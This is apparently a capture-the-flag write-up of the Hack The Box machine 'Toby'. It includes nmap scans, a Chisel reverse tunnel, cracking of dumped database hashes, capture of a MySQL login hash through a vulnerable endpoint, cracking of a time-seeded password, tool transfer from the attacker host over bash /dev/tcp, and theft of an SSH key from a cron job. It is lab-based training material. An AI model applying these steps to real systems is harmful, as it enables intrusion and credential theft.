                <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">       
        </head>                                                     
        <style>                

                /* BASIC */

                ul {                             
                  list-style-type: none;
...[snip]...                  

```

I’ll upload a [statically compiled nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) and scan the hosts.

```

www-data@wordpress:/tmp$ ./n 172.69.0.100-105

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-10-09 10:32 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for b92835f39149.tobynet (172.69.0.100)
Host is up (0.00028s latency).
Not shown: 1206 closed ports
PORT   STATE SERVICE
53/tcp open  domain

Nmap scan report for wordpress.toby.htb (172.69.0.101)
Host is up (0.00079s latency).
Not shown: 1205 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap scan report for mysql.tobynet (172.69.0.102)
Host is up (0.00077s latency).
Not shown: 1205 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
3306/tcp open  mysql

Nmap scan report for personal.tobynet (172.69.0.104)
Host is up (0.00025s latency).
Not shown: 1206 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for gogs.tobynet (172.69.0.105)
Host is up (0.00017s latency).
Not shown: 1206 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 6 IP addresses (5 hosts up) scanned in 1.42 seconds

```

Interesting that the MySQL and Gogs hosts are listening on SSH. Gogs isn’t showing any HTTP, but Gogs listens on 3000 by default, and if I check that, it’s open.

#### MySQL

I want to check out the database, and I’ve got creds to it from above. Unfortunately, I don’t have any good tools in this container to query it. I could use PHP, but I’ll tunnel it instead with [Chisel](https://github.com/jpillora/chisel). I’ll upload the binary to the wordpress container with `curl`, one of the few programs here:

```

www-data@wordpress:/tmp$ curl -s 10.10.14.6/chisel_1.7.6_linux_amd64 -o c

```

I’ll work out of `/tmp` as `dev/shm` is mounted noexec. I’ll start it as a server server on my client:

```

oxdf@hacky$ ./chisel_1.7.6_linux_amd64 server -p 8000 --reverse
2021/10/08 15:37:11 server: Reverse tunnelling enabled
2021/10/08 15:37:11 server: Fingerprint N52pbJIIK/5bKBt+7XNYJZrb3MPo7gLjp2cYCIwG6CM=
2021/10/08 15:37:11 server: Listening on http://0.0.0.0:8000

```

Now I’ll connect the client:

```

www-data@wordpress:/tmp$ ./c client 10.10.14.6:8000 R:socks
2021/10/08 19:38:44 client: Connecting to ws://10.10.14.6:8000
2021/10/08 19:38:45 client: Connected (Latency 88.955517ms

```

`R:socks` tells Chisel to allow for me to do a reverse Socks proxy from the server through the client. The connection shows up at the server as well:

```

2021/10/08 15:38:44 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

```

I’ll make sure my `/etc/proxychains.conf` file has a SOCKS5 proxy through 1080:

```

[ProxyList]
socks5  127.0.0.1 1080

```

Now I can connect:

```

oxdf@hacky$ proxychains mysql -h 172.69.0.102 -u root -pOnlyTheBestSecretsGoInShellScripts
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-172.69.0.102:3306-<><>-OK
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 1083
Server version: 8.0.26 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>

```

The databases for Gogs and WordPress are here:

```

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| gogs               |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
6 rows in set (0.094 sec)

```

I’ll start with Gogs. There’s a bunch of tables:

```

MySQL [(none)]> use gogs;

Database changed
MySQL [gogs]> show tables;
+--------------------------+
| Tables_in_gogs           |
+--------------------------+
| access                   |
| access_token             |
...[snip]...
| two_factor               |
| two_factor_recovery_code |
| upload                   |
| user                     |
| version                  |
| watch                    |
| webhook                  |
+--------------------------+
37 rows in set (0.096 sec)

```

The `user` table jumps out as interesting:

```

MySQL [gogs]> describe user;
+----------------------+---------------+------+-----+---------+----------------+
| Field                | Type          | Null | Key | Default | Extra          |
+----------------------+---------------+------+-----+---------+----------------+
| id                   | bigint        | NO   | PRI | NULL    | auto_increment |
| lower_name           | varchar(255)  | NO   | UNI | NULL    |                |
| name                 | varchar(255)  | NO   | UNI | NULL    |                |
| full_name            | varchar(255)  | YES  |     | NULL    |                |
| email                | varchar(255)  | NO   |     | NULL    |                |
| passwd               | varchar(255)  | NO   |     | NULL    |                |
| login_source         | bigint        | NO   |     | 0       |                |
| login_name           | varchar(255)  | YES  |     | NULL    |                |
| type                 | int           | YES  |     | NULL    |                |
| location             | varchar(255)  | YES  |     | NULL    |                |
| website              | varchar(255)  | YES  |     | NULL    |                |
| rands                | varchar(10)   | YES  |     | NULL    |                |
| salt                 | varchar(10)   | YES  |     | NULL    |                |
| created_unix         | bigint        | YES  |     | NULL    |                |
...[snip]...
| num_members          | int           | YES  |     | NULL    |                |
+----------------------+---------------+------+-----+---------+----------------+
32 rows in set (0.093 sec)

```

I’ll dump the interesting bits:

```

MySQL [gogs]> select id,name,passwd,salt from user;                                                                                     
+----+------------+------------------------------------------------------------------------------------------------------+------------+ 
| id | name       | passwd                                                                                               | salt       | 
+----+------------+------------------------------------------------------------------------------------------------------+------------+ 
|  2 | toby-admin | 8a611020ad6c56ffd791bf334d32d32748baae42975259607ce268c274a42958ad581686151fe1bb0b736370c82fa6afebcf | PlCxfl4BrQ | 
+----+------------+------------------------------------------------------------------------------------------------------+------------+ 
1 row in set (0.091 sec)  

```

Only one user, toby-admin.

I’ll take a similar path in the WP database to find two more users with hashes:

```

MySQL [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url            | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+---------------------+-------------+--------------+
|  1 | toby       | $P$Bc.z9Qg7LCeVxEK8MxETkfVi7FdXSb0 | toby          | toby@toby.htb       | http://192.168.0.43 | 2021-07-08 12:00:13 |                     |           0 | toby         |
|  2 | toby-admin | $P$B3xHYCYdc8rgZ6Uyg5kzgmeeLlEMUL0 | toby-admin    | toby-admin@toby.htb | http://.            | 2021-08-28 18:17:33 |                     |           0 | . .          |
+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+---------------------+-------------+--------------+
2 rows in set (0.090 sec)

```

### Hashcat

I’ll use Hashcat to break the WordPress hashes. They look like WordPress Md5 from the [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) list. toby-admin’s breaks pretty quickly:

```

$ hashcat -m 400 --user wordpress-hashes /usr/share/wordlists/rockyou.txt 
...[snip]...
$P$B3xHYCYdc8rgZ6Uyg5kzgmeeLlEMUL0:tobykeith1    
...[snip]...

```

I could also crack the Gog’s hash, but there’s no need as the password tobykeith1 works to log into Gogs.

### Personal Site - Gogs

#### Source Code

Authed as toby-admin, there are two additional repos that are accessible:

![image-20211008160148361](https://0xdfimages.gitlab.io/img/image-20211008160148361.png)

I’ll need `supportsystem-db` later. For now, I’ll focus on `personal-webapp`. There’s an `app.py`, and a `templates` folder. `app.py` is a Flask application, likely the one I saw earlier. The routes are defined in two sections, API and Frontend. The Frontend stuff are all returning static pages:

![image-20211008162820558](https://0xdfimages.gitlab.io/img/image-20211008162820558.png)

The API section has two paths:

[![image-20211008162843859](https://0xdfimages.gitlab.io/img/image-20211008162843859.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211008162843859.png)

#### dbtest

The `dbtest` function is most interesting. If there’s a parameter “secretdbtest\_09ef” and it passes `validate_ip`, then it will set the hostname of the MySQL server to that parameter, and then try to connect to it using `mysql`.

The `validate_ip` function looks solid:

```

def validate_ip(ip):
        try:
                if "/" in ip:
                        raise ValueError("Please no netmasks!")
                _ = ipaddress.ip_address(ip)
        except Exception as e:
                return False
        return True

```

I don’t see a way to inject into this. But I will come back to exploit this later.

#### api\_password

There’s a password generation algorithm, and it’s quite weak:

```

def api_password():
	chars = string.ascii_letters + string.digits
	random.seed(int(time.time()))
	password = ''.join([random.choice(chars) for x in range(32)])
	return Response(json.dumps({"password": password}), mimetype="application/json")

```

Because it’s seeding `random` with `int(time.time())`, if I know roughly the date during which the password was created, I can generate the list of passwords from around that time.

#### Git Repo

I’ll download a copy of the Git repo and look for creds, or old versions of the passwords that are now in environment variables. I just need to enter the username and password when prompted:

```

oxdf@hacky$ git clone http://backup.toby.htb/toby-admin/personal-webapp.git
Cloning into 'personal-webapp'...
Username for 'http://backup.toby.htb': toby-admin
Password for 'http://toby-admin@backup.toby.htb': 
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (12/12), done.
remote: Total 12 (delta 5), reused 0 (delta 0)
Unpacking objects: 100% (12/12), 4.32 KiB | 442.00 KiB/s, done.

```

Unfortunately, despite the different update comments in the source, there’s only one previous commit:

```

oxdf@hacky$ git log --oneline 
4dda252 (HEAD -> master, origin/master, origin/HEAD) Fix static files
7e56dd8 Add all files for webapp

```

The only change between the two is the `static_folder` setting in the Flask app creation and the seeding of the pseudo-random number generator with the current time (it shows nicely in the Gogs GUI as well):

[![image-20211008171445621](https://0xdfimages.gitlab.io/img/image-20211008171445621.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211008171445621.png)

There is a vulnerability in how this app is now handling statistics, by setting the `/static` path to point to the current directory instead of the default `static` directory. This can can lead to file read in that directory, like a source code leak. For example, I can get `app.py`:

```

www-data@wordpress:/var/www/html$ curl personal.toby.htb/static/app.py
#!/usr/bin/python3     
                                                                    
import json                                    
import random
import time      
import string
from subprocess import Popen, PIPE       
import os
import ipaddress    
from flask import *
                                                                    
app = Flask(__name__, static_folder="", static_url_path="/static")
                                                                    
def validate_ip(ip):
        try:                                
                if "/" in ip:
                        raise ValueError("Please no netmasks!")
                _ = ipaddress.ip_address(ip)
        except Exception as e:
                return False
        return True

## API START
                                                                    
# NOT FOR PROD USE, USE FOR HEALTHCHECK ON DB
...[snip]...

```

It matches what I already have. I looked for other files like a `.env`, but came up empty.

### Get jack’s Password

#### Get MySQL Hash

The `/api/dbtest` function will try to connect to the MySQL host using these creds:

```

www-data@wordpress:/var/www/html$ curl personal.toby.htb/api/dbtest
mysql: [Warning] Using a password on the command line interface can be insecure.
ERROR 1045 (28000): Access denied for user 'jack'@'172.69.0.104' (using password: YES)

```

It fails, but I do learn the username is jack.

I noted above that the dbtest function should connect somewhere else if I give it a valid IP. I’ll try:

```

www-data@wordpress:/var/www/html$ curl personal.toby.htb/api/dbtest?secretdbtest_09ef=10.10.14.6

```

This hangs, but at `nc` on my host listening on 3306 (MySQL), there’s a connection:

```

oxdf@hacky$ nc -lnvp 3306
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::3306
Ncat: Listening on 0.0.0.0:3306
Ncat: Connection from 10.10.10.140.
Ncat: Connection from 10.10.10.140:44630.

```

I had a similar challenge in [Kryptos](/2019/09/21/htb-kryptos.html#auth-bypass) a long time ago, and I showed how I can use Wireshark to capture the hash and salts. I’ll follow the same procedure. On Parrot, I had to install it with `sudo apt install mariadb-server`. Then I’ll start it with `sudo service mysql start`. I can confirm it’s listening on 3306:

```

oxdf@hacky$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -   ...[snip]...

```

However, it’s only listening on localhost. In `/etc/mysql/mariadb.conf.d/50-server.cnf`, I’ll update the `bind-address`:

```

# Instead of skip-networking the default is now to listen only on
# localhost which is more compatible and is not less secure.
#bind-address            = 127.0.0.1
bind-address            = 0.0.0.0

```

Now I’ll restart the service, and it’s listening on all interfaces:

```

oxdf@hacky$ sudo service mysql restart
oxdf@hacky$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -
...[snip]..

```

I’ll start Wireshark listening, and run that same `curl` command again:

![image-20211008174843267](https://0xdfimages.gitlab.io/img/image-20211008174843267.png)

Unfortunately, before the client event gets to say anything, the server has rejected it because of it’s IP:

![image-20211101123401139](https://0xdfimages.gitlab.io/img/image-20211101123401139.png)

I’ll create a jack user from Toby’s IP on my local MySQL instance:

```

oxdf@hacky$ sudo mysql
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 32
Server version: 10.5.12-MariaDB-0+deb11u1 Debian 11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> create user jack@10.10.11.121 identified by 'goodpassword';
Query OK, 0 rows affected (0.001 sec)

```

Now it’s still rejected, but after it sends the password almost certainly because the password isn’t what I set above:

![image-20211101123538831](https://0xdfimages.gitlab.io/img/image-20211101123538831.png)

In Wireshark, there’s the Server Greeting that has two salts I’ll need:

![image-20211101123738435](https://0xdfimages.gitlab.io/img/image-20211101123738435.png)

This is the server giving the client two random salts to use when generating the hash. The client responds with the Login Request packet which includes the username and generated hash:

![image-20211101123846024](https://0xdfimages.gitlab.io/img/image-20211101123846024.png)

The send this to Hashcat, I’ll need the following format:

```

$mysqlna$[8 char salt in hex][12 char salt in hex]*[password hash]

```

I’ll calculate the hex:

```

oxdf@hacky$ echo -n 's{1!OJe?K;%Fp#Zz{weu' | xxd -p
737b31214f4a653f4b3b254670235a7a7b776575

```

That makes:

```

$mysqlna$737b31214f4a653f4b3b254670235a7a7b776575*62fbcf8b7abe32279cce58d1afc5ecea7803d704

```

I can try to crack this with rockyou, but it fails.

#### Generate Password List

On the personal website there’s a password generation tool that seeds the pseudo-random number generator with the current time. There are also a comments over the `dbtest` function saying that creds were added in 7/7, and moved to the environment variable on 10/7 (presumably this is European format of DD/MM/YYYY):

```

# NOT FOR PROD USE, USE FOR HEALTHCHECK ON DB
# 01/07/21 - Added dbtest method and warning message
# 06/07/21 - added ability to test remote DB
# 07/07/21 - added creds
# 10/07/21 - removed creds and placed in environment

```

If I guess that the author used their own password generator to create the password, and that it was created on sometime between 7-10 July 2021, then I can generate the list of 4 \* 24 \* 60 \* 60 = 345600 possible passwords generated over the timeframe.

`time.time()` generates the current [epoch time](https://en.wikipedia.org/wiki/Unix_time), which is the number of seconds since midnight on 1 January 1970. It generates a number with six decimal places, but `int()` chops that to the nearest integer.

```

#!/usr/bin/env python3

import datetime             
import random
import string

start = int(datetime.datetime.strptime('07-07-2021', "%d-%m-%Y").timestamp())

chars = string.ascii_letters + string.digits        
for t in range(start, start+(4*24*60*60)):
    random.seed(t)                   
    password = ''.join([random.choice(chars) for x in range(32)])    
    print(password)

```

It will generate the expected number of passwords:

```

oxdf@hacky$ python3 gen_passwords.py > passwordlist
oxdf@hacky$ wc -l passwordlist 
345600 passwordlist

```

345,600 is a lot, but not for something like `hashcat`.

#### Hashcat

Feeding the hash plus this wordlist into Hashcat breaks it very quickly:

```

$ hashcat -m 11200 jack-mysql-hash passwordlist 
...[snip]...
$mysqlna$737b31214f4a653f4b3b254670235a7a7b776575*62fbcf8b7abe32279cce58d1afc5ecea7803d704:4DyeEYPgzc7EaML1Y3o0HvQr9Tp9nikC
...[snip]...

```

### SSH

That password doesn’t work for jack or root on the host, or for jack or root on the Gogs container. But it does on the MySQL container:

```

oxdf@hacky$ sshpass -p '4DyeEYPgzc7EaML1Y3o0HvQr9Tp9nikC' ssh jack@toby.htb
Warning: Permanently added 'toby.htb,10.10.10.140' (ECDSA) to the list of known hosts.
Permission denied, please try again.

oxdf@hacky$ proxychains sshpass -p '4DyeEYPgzc7EaML1Y3o0HvQr9Tp9nikC' ssh jack@172.69.0.102
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-172.69.0.102:22-<><>-OK
Linux mysql.toby.htb 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Oct  9 10:37:39 2021 from 172.69.0.101
jack@mysql:~$

```

## Shell as jack on Toby

### Enumeration

The container is pretty empty. I already looked at the database and there wasn’t much else there. To look for processes, I uploaded [pspy](https://github.com/DominicBreuker/pspy). Given the complete lack of tools on this container, I had to use this [Bash trick](https://www.linuxjournal.com/content/more-using-bashs-built-devtcp-file-tcpip) using `/dev/tcp` and redirection (similar to the [Bash rev shell](https://www.youtube.com/watch?v=OjkVep2EIlw)). First, I’ll have `nc` listening to serve `pspy64` on my host:

```

oxdf@hacky$ cat pspy64 | nc -lnvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443

```

Now use `exec` to connect:

```

jack@mysql:~$ exec 3<>/dev/tcp/10.10.14.6/443

```

At `nc`, there’s the connection:

```

Ncat: Connection from 10.10.10.140.
Ncat: Connection from 10.10.10.140:36664.

```

Now I can read from it:

```

jack@mysql:~$ cat <&3 > p

```

When it’s done, check both hashes to make sure it worked:

```

jack@mysql:~$ md5sum p
e04a36bb5444f2275990567614e1f509  p

```

```

oxdf@hacky$ md5sum pspy64
e04a36bb5444f2275990567614e1f509  pspy64

```

Now I’ll run `pspy`. It initially shows the processes that are already running, but there’s not much there. However, every minute it shows something like this:

```

2021/10/09 10:57:01 CMD: UID=0    PID=52954  | runc init 
2021/10/09 10:57:01 CMD: UID=0    PID=52959  | runc init 
2021/10/09 10:57:01 CMD: UID=0    PID=52965  | sh -c mysqldump wordpress -uroot -pOnlyTheBestSecretsGoInShellScripts > /tmp/tmp.bJUwfFuUOB/backup.txt 
2021/10/09 10:57:01 CMD: UID=0    PID=52966  | runc init 
2021/10/09 10:57:01 CMD: UID=0    PID=52974  | runc init 
2021/10/09 10:57:01 CMD: UID=0    PID=52981  | runc init 
2021/10/09 10:57:01 CMD: UID=0    PID=52987  | scp -o StrictHostKeyChecking=no -i /tmp/tmp.bJUwfFuUOB/key /tmp/tmp.bJUwfFuUOB/backup.txt jack@172.69.0.1:/home/jack/backups/1633777021.txt 
2021/10/09 10:57:03 CMD: UID=0    PID=52988  | runc init

```

It looks like it’s dumping the database, and then copying the result using `scp` back to 172.169.0.1, which is likely the host.

Whatever cron is doing this must be creating the temp directory in `/tmp` (likely using `mktemp -d` based on the dir name), and then cleaning up when it’s done.

### Capture Key

If I try to run that `cat` command when there’s nothing there, it errors, and the return code is 1:

```

jack@mysql:~$ cat /tmp/*/key
cat: '/tmp/*/key': No such file or directory
jack@mysql:~$ echo $?
1

```

I’ll use a loop like this:

```

while :;
    do cat /tmp/*/key 2>/dev/null;
    if [ $? -ne 1 ]; then
        break;
    fi
done

```

It’s a “while true” loop, but if the return code from that `cat` isn’t 1, then it breaks the loop.

```

jack@mysql:~$ while : ; do cat /tmp/*/key 2>/dev/null; if [ $? -ne 1 ]; then break; fi; done
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAoklCLF2ADUXkxp6NeQjdMjpoNbc0PUG2wumQ10nf1aIl3pils2QS
ZYvEGk+eYsJZCnnLZTe2kJ8U073MrpVlmLtmHlDtdKCZfEguzc9nZjKHIICamNsMNhpTLs
...[snip]...
wJ3Z9QCVL74NS/G8YcZiGR8DvWlH65eI9N892+EwcA0pptnV5oEs3ef5YY7+56PxvKe11N
1WV9Zy6HwXxxoTrXpV2B80Sy/sGFU33QWHbVEHC4SKggdauMbRmHkjCZoDmUqfsNvUhNQb
0jZ2DP0AFwApsAAAAIcm9vdEBsYWIBAgM=
-----END OPENSSH PRIVATE KEY-----

```

### SSH

The key works to SSH to the host as jack:

```

oxdf@hacky$ ssh -i ~/keys/toby-jack jack@toby.htb
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-81-generic x86_64)
...[snip]...
Last login: Mon Jul 12 16:17:23 2021 from 192.168.0.42
jack@toby:~$

```

And I can grab `user.txt`:

```

jack@toby:~$ cat user.txt
94837d9f************************

```

## Shell as root

### Enumeration

#### Host

There’s not a lot on the host for privesc based on typical enumeration. No `sudo`, unusual SUID binaries.

[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) didn’t return anything particularly useful, and `pspy` didn’t spot much I hadn’t already observed.

#### supportsystem-db - Gogs

The other repo in toby-admin’s Gogs instance was named supportsystem-db. It has only one commit, and a single file:

[![image-20211009143652556](https://0xdfimages.gitlab.io/img/image-20211009143652556.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211009143652556.png)

The file is a SQLite database:

```

oxdf@hacky$ file support_system.db 
support_system.db: SQLite 3.x database, last written using SQLite version 3031001

```

I’ll open it with `sqlite3`, and see there are two tables:

```

oxdf@hacky$ sqlite3 support_system.db 
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .tables
enc_meta     support_enc

```

The `enc_meta` table has encryption metadata, and three rows:

```

sqlite> .schema enc_meta 
CREATE TABLE enc_meta (
                                        enc_key TEXT NOT NULL,
                                        enc_iv TEXT NOT NULL,
                                        enc_mode TEXT NOT NULL
                        );
sqlite> select * from enc_meta;
a3f2c368548d89ef3b81fe8a3cb75bd0a7365d60b4d0dfa9271f451bd71acbd5|c02905262cef2acd6a4002226f08be02|AES-CBC
3c621a058be8c975fa95f7342832e0b3de6ff010514419c73c89da0b4449eec0|e716209dd10c3c4b32e5366372cfd917|AES-CBC
bb89aa0bdc765946bba46514e8c5ea5cdade26485f5daee74b28225dd1e22339|6e9d20d41bcfd75e595dd0a196301715|AES-CBC

```

`support_enc` has three rows of encrypted messages:

```

sqlite> .schema support_enc
CREATE TABLE support_enc (
                                        user TEXT NOT NULL,
                                        support_submit_date INTEGER NOT NULL,
                                        enc_blob TEXT NOT NULL,
                                        enc_id INTEGER NOT NULL
                        );
sqlite> select * from support_enc;
jack@toby.htb|1630176122|8dadda77134736074501b69eef9eb21ffdb5d4827565ab9ce50587349325ca27de85c94f318293df5c15d5177ecdcf4876f90b57cce5cd81a61275ac24971fe9|1
jack@toby.htb|1630176122|740e66f585adae9d02d4003116ffb9082779744ab1c21c420c4dd2c1aa53f265db23958e2a6af21bed36d160844d7c99ce3ae0921b94476567148269c2ee93857e4f2798feb1118e9d17974ade1310a70ed6707acd3ccd92c211f30f86cc2febbf9ad2178b243a3cd4923529770f81dc76a923f39de902b08dfe8c97af64e2132e01b1e0ec62532604e2f932e6189c27a41cd833ee54536e515588d58deb4fa7ebddb9d6a827624aee18601b40f23c6002b40a2c99e417f8f26bb55783e38768|2
jack@toby.htb|1630176122|6292b9d69fed2672735a1b66a2cffe65|3

```

Given the three rows in each table, it seems like a good guess that the `enc_id` in `support_enc` correspond to the row number in `enc_meta`. In [Cyberchef](https://gchq.github.io/CyberChef/), the first message decrypts:

![image-20220414085302332](https://0xdfimages.gitlab.io/img/image-20220414085302332.png)

The three messages are:

| Row | Message |
| --- | --- |
| 1 | This support system sucks, we need to change it! |
| 2 | Hi, my authentication has been really slow since we were attacked. I ran some scanners as my user but didn’t find anything out of the ordinary. Can an engineer please come and look? |
| 3 | [Undecyptable] |

It’s not clear why the third message fails to decrypt. The second message about authentication is a hint here.

#### su

Since the complaint is about auth being slow, I tested `su` on Toby and on my local Ubuntu machine. Ubuntu:

```

$ time echo | su -
Password: su: Authentication failure

real	0m3.241s
user	0m0.001s
sys	0m0.004s

```

Toby:

```

jack@toby:/$ time echo | su - 
Password: su: Authentication failure

real    0m1.021s
user    0m0.014s
sys     0m0.006s

```

Toby was significantly faster. I wonder if this issue was already addressed?

#### pam

Linux Pluggable Authentication Modules (PAM) is a set of libraries that handle the authentication, allowing different ones to handle different situations. [This post](https://www.redhat.com/sysadmin/pluggable-authentication-modules-pam) gives a decent overview. The configuration files are kept in `/etc/pam.d`.

My first thought was to look at the timestamps for ones with fractional timestamps:

```

jack@toby:/etc/pam.d$ ls -l --full-time 
total 96
-rw-r--r-- 1 root root  250 2018-07-24 12:41:23.000000000 +0000 atd
-rw-r--r-- 1 root root  384 2020-02-07 15:32:06.000000000 +0000 chfn
-rw-r--r-- 1 root root   92 2020-02-07 15:32:06.000000000 +0000 chpasswd
-rw-r--r-- 1 root root  581 2020-02-07 15:32:06.000000000 +0000 chsh
-rw-r--r-- 1 root root 1231 2021-08-28 16:45:08.295710746 +0000 common-account
-rw-r--r-- 1 root root 1348 2021-08-28 16:45:08.295710746 +0000 common-auth
-rw-r--r-- 1 root root 1464 2021-08-28 16:45:08.299711131 +0000 common-password
-rw-r--r-- 1 root root 1508 2021-08-28 16:45:08.299711131 +0000 common-session
-rw-r--r-- 1 root root 1435 2021-08-28 16:45:08.303711515 +0000 common-session-noninteractive
-rw-r--r-- 1 root root  606 2020-02-11 03:43:40.000000000 +0000 cron
-rw-r--r-- 1 root root 4120 2021-07-14 09:50:51.294641427 +0000 login
-rw-r--r-- 1 root root   92 2020-02-07 15:32:06.000000000 +0000 newusers
-rw-r--r-- 1 root root  520 2019-12-17 16:41:40.000000000 +0000 other
-rw-r--r-- 1 root root   92 2020-02-07 15:32:06.000000000 +0000 passwd
-rw-r--r-- 1 root root  270 2019-08-16 12:37:39.000000000 +0000 polkit-1
-rw-r--r-- 1 root root  143 2019-07-28 21:44:43.000000000 +0000 runuser
-rw-r--r-- 1 root root  138 2019-07-28 21:44:43.000000000 +0000 runuser-l
-rw-r--r-- 1 root root 2133 2020-05-29 07:37:09.000000000 +0000 sshd
-rw-r--r-- 1 root root 2265 2021-07-14 09:48:36.951038508 +0000 su
-rw-r--r-- 1 root root  137 2019-07-28 21:44:44.000000000 +0000 su-l
-rw-r--r-- 1 root root  239 2020-02-03 14:32:18.000000000 +0000 sudo
-rw-r--r-- 1 root root  317 2020-04-22 09:04:26.000000000 +0000 systemd-user
-rw-r--r-- 1 root root  119 2020-03-09 16:10:31.000000000 +0000 vmtoolsd

```

Immediately, `common-*` and `login` jump out as interesting. The ones with no fractional seconds are installed by the package managed. But the others have been modified otherwise.

This was a bit deflating when I checked my Ubuntu install and saw the same pattern in `common-*`:

```

$ ls -l --full-time 
total 116
-rw-r--r-- 1 root root  250 2018-07-24 08:41:23.000000000 -0400 atd
-rw-r--r-- 1 root root  384 2020-02-07 10:32:06.000000000 -0500 chfn
-rw-r--r-- 1 root root   92 2020-02-07 10:32:06.000000000 -0500 chpasswd
-rw-r--r-- 1 root root  581 2020-02-07 10:32:06.000000000 -0500 chsh
-rw-r--r-- 1 root root 1208 2021-09-22 09:26:34.935172326 -0400 common-account
-rw-r--r-- 1 root root 1249 2021-09-22 09:26:34.931172295 -0400 common-auth
-rw-r--r-- 1 root root 1480 2021-09-22 09:26:34.935172326 -0400 common-password
-rw-r--r-- 1 root root 1470 2021-09-22 09:26:34.935172326 -0400 common-session
-rw-r--r-- 1 root root 1435 2021-09-22 09:26:34.939172358 -0400 common-session-noninteractive
-rw-r--r-- 1 root root  606 2020-02-10 22:43:40.000000000 -0500 cron
-rw-r--r-- 1 root root   69 2020-02-17 03:19:56.000000000 -0500 cups
-rw-r--r-- 1 root root 1192 2019-10-07 12:23:07.000000000 -0400 gdm-autologin
-rw-r--r-- 1 root root 1342 2019-10-07 12:23:07.000000000 -0400 gdm-fingerprint
-rw-r--r-- 1 root root  383 2019-10-07 12:23:07.000000000 -0400 gdm-launch-environment
-rw-r--r-- 1 root root 1320 2019-10-07 12:23:07.000000000 -0400 gdm-password
-rw-r--r-- 1 root root 4126 2020-04-16 08:36:45.000000000 -0400 login
-rw-r--r-- 1 root root   92 2020-02-07 10:32:06.000000000 -0500 newusers
-rw-r--r-- 1 root root  520 2019-12-17 11:41:40.000000000 -0500 other
-rw-r--r-- 1 root root   92 2020-02-07 10:32:06.000000000 -0500 passwd
-rw-r--r-- 1 root root  270 2019-08-16 08:37:39.000000000 -0400 polkit-1
-rw-r--r-- 1 root root  168 2019-02-08 11:37:29.000000000 -0500 ppp
-rw-r--r-- 1 root root  143 2019-07-28 17:44:43.000000000 -0400 runuser
-rw-r--r-- 1 root root  138 2019-07-28 17:44:43.000000000 -0400 runuser-l
-rw-r--r-- 1 root root 2133 2021-03-09 09:17:50.000000000 -0500 sshd
-rw-r--r-- 1 root root 2257 2019-07-28 17:44:43.000000000 -0400 su
-rw-r--r-- 1 root root  239 2020-02-03 09:32:18.000000000 -0500 sudo
-rw-r--r-- 1 root root  137 2019-07-28 17:44:44.000000000 -0400 su-l
-rw-r--r-- 1 root root  317 2020-04-22 05:04:26.000000000 -0400 systemd-user

```

I’ll copy all these files to my local host with `scp -i ~/keys/toby-jack jack@toby.htb:/etc/pam.d/* pam.d/`. Looking at what was different between my Ubuntu unmodified and Toby, the delay was removed for failures on Toby:

```

$ diff login ~/hackthebox/toby-10.10.10.140/pam.d/login 
9c9
< auth       optional   pam_faildelay.so  delay=3000000
---
> auth       optional   pam_faildelay.so  delay=0

```

In `common-account` the `nodelay` option was added:

```

